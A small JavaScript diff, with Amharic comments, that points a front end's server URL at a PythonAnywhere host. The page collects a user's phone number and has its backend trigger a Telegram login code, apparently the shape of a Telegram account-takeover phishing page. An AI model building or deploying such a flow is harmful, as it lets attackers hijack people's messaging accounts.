@@ -14,8 +14,8 @@ const maskedUserPhone = document.getElementById('maskedUserPhone');
 // Store user data temporarily
 let userPhoneNumber = '';
 
-// Backend Server URL (በኮምፒዩተርዎ ላይ ሲሰራ localhost:5000 ይጠቀማል)
-const SERVER_URL = 'http://127.0.0.1:5000';
+// Backend Server URL (በ PythonAnywhere የተስተካከለ አድራሻ)
+const SERVER_URL = 'https://robot56.pythonanywhere.com';
 
 // 1. When user clicks "Next" on Phone Page -> Sends request to Python to trigger Telegram OTP
 nextBtn.addEventListener('click', async () => {
